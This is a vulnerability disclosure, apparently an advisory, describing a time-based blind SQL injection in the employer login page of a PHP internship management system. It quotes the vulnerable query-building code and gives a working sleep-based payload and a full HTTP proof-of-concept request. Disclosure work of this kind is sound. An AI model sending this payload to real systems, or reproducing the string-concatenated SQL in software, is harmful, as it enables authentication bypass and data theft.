## Internship Portal file `employer/login.php` contains a Time-Based Blind SQL Injection vulnerability

Impact of the vulnerability
An attacker can inject SQL syntax into the `email` parameter on the employer login endpoint. Because the application concatenates untrusted input directly into the SQL statement, an attacker can trigger database-side delays and confirm injection without valid credentials. This can lead to:

- Authentication bypass in some payload variants
- Database information disclosure through blind inference
- Further compromise of employer accounts and backend data

### Payload:

`sksksharma0@gmail.com'and(select*from(select+sleep(5))a/**/union/**/select+1)='`

```text
sksksharma0@gmail.com'and(select*from(select+sleep(5))a/**/union/**/select+1)='
```

### POC:

The vulnerable endpoint is `POST /employer/login.php`. The `email` and `password` parameters are inserted into SQL without parameterization. The relevant code in `employer/login.php` is:

```php
$password = $_POST['password'];
$sql = "SELECT * FROM employer WHERE password = '$password' AND email = '$email'";
```

Send the following request:

```http
POST /employer/login.php HTTP/1.1
Host: internship
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=qithgp1m1at8bieavidf4ddlnc

email=sksksharma0@gmail.com'and(select*from(select+sleep(5))a/**/union/**/select+1)='&password=452&login=
```

Expected result:
The server response is delayed by about 5 seconds, which indicates that the injected `sleep(5)` expression was executed by the database. This confirms a time-based blind SQL injection in the `email` parameter of the employer login function.

### Sources download:

```text
https://code-projects.org/internship-management-system-in-php-with-source-code/
```

[Internship Management System In PHP With Source Code - Source Code & Projects](https://code-projects.org/internship-management-system-in-php-with-source-code/)



![image-20260603215648941](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260603215648941.png)
